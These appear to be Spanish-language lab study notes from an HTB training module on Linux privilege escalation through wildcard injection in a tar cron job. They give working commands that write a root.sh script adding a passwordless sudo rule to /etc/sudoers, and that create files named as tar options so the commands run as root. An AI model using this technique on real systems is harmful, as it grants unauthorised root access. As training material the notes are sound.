
Un wildcard se puede usar como reemplazo de otros caracteres y es interpretado por la shell antes de otras acciones:

![[Pasted image 20260917145322.png]]

Un ejemplo de como se puede usar para escalar privs es con el comando `tar`:

- `tar` es un programa para crear/extraer archivos. La opcion `--checkpoint-action` permite ejecutar una accion EXEC cuando alcanza un punto de control (es decir ejecuta comandos cuando tar se ejecute)
- Si ejecutamos tar con `--checkpoint=1` y `--checkpoint-action=exec=sh root.sh`, estas se pasaran como opciones de linea de comandos

Imaginemos un cron job que comprima /home/htb-student a modo de backup y se ejecute cada minuto 

![[Pasted image 20260917145713.png]]

Podemos aprovechar lso comodines en el cron job (`*`) para escribir comandos necesarios como nombres de archivos dentro de /home/htb-student para que se ejecuten como argumentos de tar:

1. Creamos el script que se especificara en los argumentos tar para ejecutarse

```
echo 'echo "htb-student ALL=(root) NOPASSWD: ALL" >> /etc/sudoers' > root.sh
```

2. Creamos los archivos vacios con nombres de opciones tar para que se pasen como argumentos

```
echo "" > "--checkpoint-action=exec=sh root.sh"
echo "" > --checkpoint=1
```
